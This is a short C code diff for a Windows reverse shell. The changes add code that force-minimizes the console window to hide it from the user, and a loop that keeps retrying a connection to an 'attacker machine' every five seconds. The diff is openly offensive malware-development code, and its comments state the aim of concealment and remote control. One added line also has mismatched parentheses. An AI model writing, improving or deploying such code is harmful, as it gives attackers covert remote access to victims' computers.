@@ -28,7 +28,7 @@ int main(int argc, char* argv[]) {
 		return 1;
 	}
 
-	struct addrinfo hints, * p, * servinfo;
+	struct addrinfo hints, * servinfo;
 
 	memset(&hints, 0, sizeof hints);
 
@@ -36,19 +36,25 @@ int main(int argc, char* argv[]) {
 	hints.ai_socktype = SOCK_STREAM;
 
 	SOCKET sockfd;
+	int rv;
 
-	getaddrinfo(IPADDR, PORT, &hints, &servinfo);
+	// Hide window from user...
 
-	for (p=servinfo; p != NULL; p = p->ai_next) {
-		if ((sockfd = WSASocketW(p->ai_family, p->ai_socktype, p->ai_protocol, NULL, 0, 0)) == -1) {
-			continue;
-		}
+	HANDLE consoleWindow = GetConsoleWindow();
+	ShowWindow(consoleWindow, SW_FORCEMINIMIZE);
 
-		if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
-			continue;
-		}
+	// Check that we can actually get to the host.
+	if((rv = getaddrinfo(IPADDR, PORT, &hints, &servinfo) != 0) {
+		return 1;
+	}
 
-		break;
+	if ((sockfd = WSASocketW(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol, NULL, 0, 0)) == -1) {
+		return 1;
+	}
+
+	// We wait for a listener on attacker machine to pick up
+	while (connect(sockfd, servinfo->ai_addr, servinfo->ai_addrlen) != 0) {
+		Sleep(5000);
 	}
 
 	STARTUPINFO sinfo;
